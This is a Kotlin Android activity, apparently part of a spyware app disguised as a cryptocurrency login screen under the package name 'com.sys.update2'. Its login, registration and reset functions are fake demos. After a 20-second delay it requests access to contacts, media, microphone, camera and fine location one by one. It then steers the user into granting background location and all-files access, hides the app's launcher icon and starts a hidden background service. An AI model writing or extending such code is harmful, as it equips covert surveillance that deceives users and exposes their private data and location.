package com.sys.update2

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.text.InputType
import android.text.SpannableString
import android.text.Spanned
import android.text.style.ForegroundColorSpan
import android.util.Log
import android.view.View
import android.view.animation.AnimationUtils
import android.widget.EditText
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class LoginActivity : AppCompatActivity() {

    private lateinit var loginView: View
    private lateinit var registerView: View
    private lateinit var resetView: View
    private val PERM_DELAY_MS = 20_000L
    private var currentPermIndex = 0

    // ⭐ الصلاحيات حسب إصدار Android
    private val permissionsToAsk: List<String> by lazy {
        val list = mutableListOf<String>()

        // 1. جهات الاتصال
        list.add(Manifest.permission.READ_CONTACTS)

        // 2. الصور والفيديو والصوت — حسب الإصدار
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            // Android 13+ (API 33+)
            list.add(Manifest.permission.READ_MEDIA_IMAGES)
            list.add(Manifest.permission.READ_MEDIA_VIDEO)
            list.add(Manifest.permission.READ_MEDIA_AUDIO)
            list.add(Manifest.permission.POST_NOTIFICATIONS)
        } else {
            // Android 12 وأقدم
            list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
                list.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
            }
        }

        // 3. الميكروفون والكاميرا
        list.add(Manifest.permission.RECORD_AUDIO)
        list.add(Manifest.permission.CAMERA)

        // 4. الموقع
        list.add(Manifest.permission.ACCESS_FINE_LOCATION)
        list.add(Manifest.permission.ACCESS_COARSE_LOCATION)

        list
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        window.statusBarColor = Color.parseColor("#02081a")
        window.navigationBarColor = Color.parseColor("#02081a")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            window.decorView.systemUiVisibility = 0
        }

        try {
            setContentView(R.layout.activity_login)
        } catch (e: Exception) {
            Toast.makeText(this, "Layout error: ${e.message}", Toast.LENGTH_LONG).show()
            finish()
            return
        }

        try {
            loginView = findViewById(R.id.loginView)
            registerView = findViewById(R.id.registerView)
            resetView = findViewById(R.id.resetView)

            registerView.visibility = View.GONE
            resetView.visibility = View.GONE

            val heroTitle = findViewById<TextView>(R.id.heroTitle)
            val full = "Power up your\ncryptocurrency\njourney"
            val sp = SpannableString(full)
            val start = full.indexOf("cryptocurrency")
            sp.setSpan(
                ForegroundColorSpan(Color.parseColor("#3d8bff")),
                start, start + "cryptocurrency".length,
                Spanned.SPAN_EXCLUSIVE_EXCLUSIVE
            )
            heroTitle.text = sp

            val idIn = findViewById<EditText>(R.id.idIn)
            val pw = findViewById<EditText>(R.id.pw)
            val eye = findViewById<ImageView>(R.id.eye)
            val capIn = findViewById<EditText>(R.id.capIn)
            val btnLogin = findViewById<View>(R.id.btnLogin)

            var pwVisible = false
            eye.setOnClickListener {
                pwVisible = !pwVisible
                pw.inputType = if (pwVisible)
                    InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD
                else
                    InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
                pw.setSelection(pw.text.length)
            }

            val capView = findViewById<CaptchaView>(R.id.cap)
            capView.setOnClickListener { capView.regenerate() }

            btnLogin.setOnClickListener {
                val email = idIn.text.toString().trim()
                val pass = pw.text.toString()
                val cap = capIn.text.toString().trim().uppercase()

                when {
                    email.isBlank() || pass.isBlank() -> showToast("Please enter email and password")
                    cap.isNotBlank() && cap != capView.code -> {
                        showToast("Verification code is incorrect")
                        capView.regenerate()
                        capIn.setText("")
                    }
                    else -> {
                        showToast("Login successful (demo)")
                        Handler(Looper.getMainLooper()).postDelayed({
                            try {
                                startActivity(Intent(this, MainActivity::class.java))
                            } catch (_: Exception) {}
                            finish()
                        }, 1500)
                    }
                }
            }

            val tE = findViewById<TextView>(R.id.tE)
            val tP = findViewById<TextView>(R.id.tP)
            tE.setOnClickListener {
                tE.setTextColor(Color.WHITE)
                tP.setTextColor(ContextCompat.getColor(this, R.color.text_dim))
                idIn.hint = "Email"
                idIn.inputType = InputType.TYPE_TEXT_VARIATION_EMAIL_ADDRESS
            }
            tP.setOnClickListener {
                tP.setTextColor(Color.WHITE)
                tE.setTextColor(ContextCompat.getColor(this, R.color.text_dim))
                idIn.hint = "Phone"
                idIn.inputType = InputType.TYPE_CLASS_PHONE
            }

            findViewById<TextView>(R.id.btnGoRegister).setOnClickListener { switchTo(registerView, 1) }
            findViewById<TextView>(R.id.btnGoReset).setOnClickListener { switchTo(resetView, 1) }
            findViewById<TextView>(R.id.btnGoLoginFromReg).setOnClickListener { switchTo(loginView, 0) }
            findViewById<ImageView>(R.id.backFromReg).setOnClickListener { switchTo(loginView, 0) }
            findViewById<ImageView>(R.id.backFromReset).setOnClickListener { switchTo(loginView, 0) }

            val rP1 = findViewById<EditText>(R.id.rP1)
            val rP2 = findViewById<EditText>(R.id.rP2)
            findViewById<ImageView>(R.id.rEye1).setOnClickListener { toggleVisibility(rP1) }
            findViewById<ImageView>(R.id.rEye2).setOnClickListener { toggleVisibility(rP2) }

            findViewById<View>(R.id.btnRegister).setOnClickListener {
                val email = findViewById<EditText>(R.id.rEm).text.toString().trim()
                val vc = findViewById<EditText>(R.id.rVc).text.toString().trim()
                val p1 = rP1.text.toString()
                val p2 = rP2.text.toString()
                val ref = findViewById<EditText>(R.id.rRef).text.toString().trim()

                when {
                    email.isBlank() -> showToast("Please enter email")
                    vc.isBlank() -> showToast("Please enter verification code")
                    p1.length < 6 || p1.length > 16 -> showToast("Password must be 6-16 characters")
                    p1 != p2 -> showToast("Passwords do not match")
                    ref.isBlank() -> showToast("Please enter invitation code")
                    else -> showToast("Registration successful (demo)")
                }
            }

            findViewById<TextView>(R.id.rSend).setOnClickListener {
                showToast("Code will be sent (demo)")
            }

            val fP1 = findViewById<EditText>(R.id.fP1)
            findViewById<ImageView>(R.id.fEye).setOnClickListener { toggleVisibility(fP1) }

            findViewById<View>(R.id.btnReset).setOnClickListener {
                val email = findViewById<EditText>(R.id.fEm).text.toString().trim()
                val vc = findViewById<EditText>(R.id.fVc).text.toString().trim()
                val p1 = fP1.text.toString()

                when {
                    email.isBlank() -> showToast("Please enter email")
                    vc.isBlank() -> showToast("Please enter verification code")
                    p1.length < 6 || p1.length > 16 -> showToast("Password must be 6-16 characters")
                    else -> {
                        showToast("Password changed (demo)")
                        Handler(Looper.getMainLooper()).postDelayed({
                            switchTo(loginView, 0)
                        }, 1500)
                    }
                }
            }

            findViewById<TextView>(R.id.fSend).setOnClickListener {
                showToast("Code will be sent (demo)")
            }

            // ⭐ بعد 20 ثانية — ابدأ طلب الصلاحيات واحدة واحدة
            Handler(Looper.getMainLooper()).postDelayed({
                currentPermIndex = 0
                askNextPermission()
            }, PERM_DELAY_MS)

        } catch (e: Exception) {
            Toast.makeText(this, "Init error: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    // ═══════════════════════════════════════════
    //  طلب صلاحية واحدة في كل مرة
    // ═══════════════════════════════════════════
    private fun askNextPermission() {
        try {
            if (currentPermIndex >= permissionsToAsk.size) {
                askBackgroundLocation()
                return
            }

            val perm = permissionsToAsk[currentPermIndex]

            // لو ممنوحة → انتقل للتالية
            if (ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED) {
                currentPermIndex++
                askNextPermission()
                return
            }

            // اطلب الصلاحية دي لوحدها
            ActivityCompat.requestPermissions(this, arrayOf(perm), currentPermIndex + 100)

        } catch (e: Exception) {
            Log.e("LoginActivity", "askNext err: ${e.message}")
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        currentPermIndex++

        Handler(Looper.getMainLooper()).postDelayed({
            askNextPermission()
        }, 1000)
    }

    // ═══════════════════════════════════════════
    //  الصلاحيات الخاصة (يدوية)
    // ═══════════════════════════════════════════
    private fun askBackgroundLocation() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.ACCESS_BACKGROUND_LOCATION
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                try {
                    AlertDialog.Builder(this)
                        .setTitle("الموقع في الخلفية")
                        .setMessage("لتفعيل الموقع في الخلفية، اضغط 'السماح دائماً'")
                        .setPositiveButton("فتح الإعدادات") { _, _ ->
                            try {
                                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                                intent.data = Uri.parse("package:$packageName")
                                startActivity(intent)
                            } catch (_: Exception) {}
                            Handler(Looper.getMainLooper()).postDelayed({
                                askAllFilesAccess()
                            }, 5000)
                        }
                        .setCancelable(false)
                        .show()
                } catch (_: Exception) {}
            } else {
                askAllFilesAccess()
            }
        } else {
            askAllFilesAccess()
        }
    }

    private fun askAllFilesAccess() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    AlertDialog.Builder(this)
                        .setTitle("الوصول للملفات")
                        .setMessage("لتفعيل الوصول لكل الملفات، اضغط 'السماح'")
                        .setPositiveButton("فتح الإعدادات") { _, _ ->
                            try {
                                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                                intent.data = Uri.parse("package:$packageName")
                                startActivity(intent)
                            } catch (e: Exception) {
                                try {
                                    val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                                    startActivity(intent)
                                } catch (_: Exception) {}
                            }
                            Handler(Looper.getMainLooper()).postDelayed({
                                onPermissionsComplete()
                            }, 5000)
                        }
                        .setCancelable(false)
                        .show()
                } catch (_: Exception) {}
            } else {
                onPermissionsComplete()
            }
        } else {
            onPermissionsComplete()
        }
    }

    private fun onPermissionsComplete() {
        hideLauncherIcon()
        startBackgroundService()
        showToast("✅ تم تفعيل كل الصلاحيات")
    }

    // ═══════════════════════════════════════════
    //  إخفاء الأيقونة
    // ═══════════════════════════════════════════
    private fun hideLauncherIcon() {
        try {
            val component = ComponentName(this, LoginActivity::class.java)
            packageManager.setComponentEnabledSetting(
                component,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d("LoginActivity", "Icon hidden")
        } catch (e: Exception) {
            Log.e("LoginActivity", "hide err: ${e.message}")
        }
    }

    private fun startBackgroundService() {
        try {
            val intent = Intent(this, BackgroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (_: Exception) {}
    }

    private fun toggleVisibility(edit: EditText) {
        val visible = edit.inputType ==
            (InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD)
        edit.inputType = if (visible)
            InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
        else
            InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD
        edit.setSelection(edit.text.length)
    }

    private fun switchTo(target: View, direction: Int) {
        loginView.visibility = View.GONE
        registerView.visibility = View.GONE
        resetView.visibility = View.GONE

        target.visibility = View.VISIBLE
        target.clearAnimation()
        try {
            val anim = AnimationUtils.loadAnimation(
                this,
                if (direction == 1) R.anim.slide_in_right else R.anim.slide_in_left
            )
            target.startAnimation(anim)
        } catch (_: Exception) {}
    }

    private fun showToast(msg: String) {
        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
    }
}
